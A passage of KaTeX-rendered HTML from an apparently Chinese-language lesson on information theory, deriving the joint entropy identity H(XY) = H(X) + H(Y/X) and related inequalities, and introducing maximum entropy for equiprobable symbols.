style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span><span style="top:-5.4326em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span><span style="top:-2.0674em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span><span style="top:0.4864em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:1.9864em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.2978em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>而且可以由于信源熵是非负数，可以发现联合信源不确定性更大。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="center" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≥</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext> </mtext><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≥</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≥</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext> </mtext><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≥</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{gather*}&amp;H(XY)\ge H(X),\ H(XY)\ge H(Y)\\&amp;H(XY)\ge H(Y/X),\ H(XY)\ge H(X/Y)\end{gather*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.75em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>信源熵很重要的性质就是，<strong>当信源 X 的 n 个符号，每个符号概率相等时，信源熵取得最大值 <span class="katex"><span 